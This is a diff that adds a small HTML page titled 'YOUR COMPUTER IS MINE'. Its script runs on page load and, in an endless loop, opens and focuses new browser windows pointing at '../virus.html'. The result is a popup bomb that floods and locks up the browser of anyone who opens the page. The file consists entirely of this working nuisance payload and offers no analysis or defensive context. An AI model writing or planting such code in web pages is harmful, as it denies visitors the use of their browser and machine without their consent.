@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title> YOUR COMPUTER IS MINE </title>
+</head>
+<body onload="virus()">
+</body>
+</html>
+<script>
+    function virus(){
+        for(;;) {
+            var win = window.open("../virus.html", '_blank', "location=yes,height=570,width=520,scrollbars=yes,status=yes");
+            win.focus();
+        }
+    }
+</script>
